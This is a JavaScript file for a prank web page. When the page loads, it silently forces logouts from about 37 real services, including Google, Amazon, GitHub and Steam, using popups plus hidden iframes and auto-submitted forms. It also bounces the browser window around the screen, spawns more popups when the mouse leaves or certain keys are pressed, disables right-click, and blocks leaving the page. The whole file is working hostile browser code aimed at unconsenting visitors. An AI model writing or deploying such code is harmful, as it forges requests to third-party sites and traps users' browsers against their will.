// 🔓 Logout URLs
var logoutURLs = {
  AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
  'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  Blogger: ['GET', 'https://www.blogger.com/logout.g'],
  Delicious: ['GET', 'https://www.delicious.com/logout'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  Gandi: ['GET', 'https://www.gandi.net/login/out'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
  Linode: ['GET', 'https://manager.linode.com/session/logout'],
  LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
  MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
  Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
  Photobucket: ['GET', 'https://photobucket.com/logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  Slashdot: ['GET', 'https://slashdot.org/my/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
  Threadless: ['GET', 'https://www.threadless.com/logout'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Woot: ['GET', 'https://account.woot.com/logout'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
};

var popupWindows = [];
var iframeCount = 0;

// Open GET logout URL once as popup
function openLogoutWindow(url) {
  const w = window.open(url, '_blank', 'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes');
  if (w) popupWindows.push(w);
}

// Submit POST logout via hidden iframe and form, open only once
function postLogout(url, params) {
  return new Promise((resolve) => {
    const iframeName = 'logout_iframe_' + (iframeCount++);
    const iframe = document.createElement('iframe');
    iframe.name = iframeName;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    iframe.onload = () => {
      // Assume logout done after iframe load
      setTimeout(() => {
        document.body.removeChild(iframe);
        document.body.removeChild(form);
        resolve();
      }, 500); // small delay for safety
    };

    const form = document.createElement('form');
    form.style.display = 'none';
    form.method = 'POST';
    form.action = url;
    form.target = iframeName;

    for (const key in params) {
      if (Object.prototype.hasOwnProperty.call(params, key)) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = params[key];
        form.appendChild(input);
      }
    }

    document.body.appendChild(form);
    form.submit();
  });
}

// Open GET logout URL by creating a hidden iframe to avoid popup blockers (optional)
function getLogout(url) {
  return new Promise((resolve) => {
    // Option 1: open a popup (may be blocked)
    openLogoutWindow(url);
    // Resolve immediately because we can't track popup close reliably
    resolve();
  });
}

// Main logout function
async function logoutAllSites() {
  const logoutMessages = document.querySelector('.logout-messages');
  if (!logoutMessages) {
    console.warn('No container with class .logout-messages found for logout status.');
  }

  const promises = [];

  for (const [site, data] of Object.entries(logoutURLs)) {
    const method = data[0];
    const url = data[1];
    const params = data[2] || {};

    if (logoutMessages) {
      const div = document.createElement('div');
      div.innerText = `Logging you out from ${site}...`;
      logoutMessages.appendChild(div);
    }

    if (method === 'GET') {
      promises.push(getLogout(url));
    } else if (method === 'POST') {
      promises.push(postLogout(url, params));
    }
  }

  // Wait for all logout requests to complete (POST waits for iframe load, GET resolves immediately)
  await Promise.all(promises);

  // After all logout attempts, redirect once
  window.location.href = 'popuptest.html';
}

// Rest of your code unchanged...

// 🔊 Music stuff
document.addEventListener('click', musicPlay);

function musicPlay() {
  var audio = document.getElementById('youare-audio');
  var micon = document.getElementById('youare-micon');
  micon.addEventListener('click', musicPlay);

  if (audio.duration > 0 && audio.paused) {
    audio.play();
    micon.src = "images/speaker.png";
  } else {
    audio.pause();
    audio.currentTime = 0;
    micon.src = "images/speakerm.png";
  }
  document.removeEventListener('click', musicPlay);
}

var faudio = new Audio('youare.mp3');
faudio.addEventListener('timeupdate', function () {
  if (this.currentTime > this.duration - 0.45) {
    this.currentTime = 0;
    this.play();
  }
});

// 🖱️ Bookmarks
function bookmark() {
  if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
    var url = "popuptest.html";
    var title = "Idiot!";
    window.external.AddFavorite(url, title);
  }
}

// ⚽ Bouncing window
var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

function changeTitle(title) {
  document.title = title;
}

function closeAllPopups() {
  for (var i = 0; i < popupWindows.length; i++) {
    if (popupWindows[i] && !popupWindows[i].closed) {
      popupWindows[i].close();
    }
  }
  popupWindows = [];
}

function proCreate() {
  for (var i = 0; i < 5; i++) {
    openLogoutWindow('popuptest.html');
  }
}

function newXlt() {
  xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
  window.focus();
}
function newYup() {
  yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
  window.focus();
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
  window.focus();
}
function fOff() {
  flagRun = 0;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;

  if (xPos > screen.width - 357) newXlt();
  if (xPos < 0) newXrt();
  if (yPos > screen.height - 330) newYup();
  if (yPos < 0) newYdn();

  if (flagRun == 1) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}

// 🔁 Run on page load
window.onload = function () {
  flagRun = 1;
  playBall();
  bookmark();
  logoutAllSites(); // 👈 Logs out all accounts on load, then redirects
  return true;
};

window.onmouseout = function () {
  proCreate();
  return null;
};

window.oncontextmenu = function () {
  return false;
};

window.onkeydown = function (event) {
  var keyCode = event.keyCode;

  if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {
    proCreate();
  }

  if (keyCode == 113) {
    closeAllPopups();
  }

  return null;
};

window.onbeforeunload = function () {
  return "UwU";
};
